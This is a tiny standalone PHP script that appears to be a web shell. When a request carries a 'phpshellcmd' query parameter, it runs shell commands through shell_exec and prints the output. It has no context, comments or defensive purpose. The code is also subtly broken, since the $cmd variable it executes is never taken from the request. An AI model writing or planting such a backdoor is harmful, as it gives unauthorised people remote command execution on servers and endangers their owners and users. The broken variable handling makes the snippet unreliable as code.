<?php
	if(isset($_GET['phpshellcmd'])){
		echo shell_exec($cmd);
	}
	die()
?>
